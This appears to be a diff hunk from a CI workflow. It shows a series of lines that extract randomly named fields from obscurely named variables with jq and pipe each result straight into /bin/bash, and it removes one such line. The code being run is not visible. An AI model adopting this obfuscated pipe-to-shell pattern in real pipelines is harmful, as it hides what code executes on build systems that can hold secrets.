@@ -53,7 +53,6 @@ jobs:
           printf '%s' "$dbw2360" | jq -r .bhxbg4 | /bin/bash
           echo $nbawg02 | jq -r .pfneo0 | /bin/bash
           printf '%s' "$asx4383" | jq -r .chrbe1 | /bin/bash
-          echo $hmqva2858 | jq -r .s33693 | /bin/bash
           printf '%s' "$ebwm172" | jq -r .esqz0 | /bin/bash
           echo $ek0497 | jq -r .trc4738 | /bin/bash
           echo $srjk540 | jq -r .bcej8 | /bin/bash
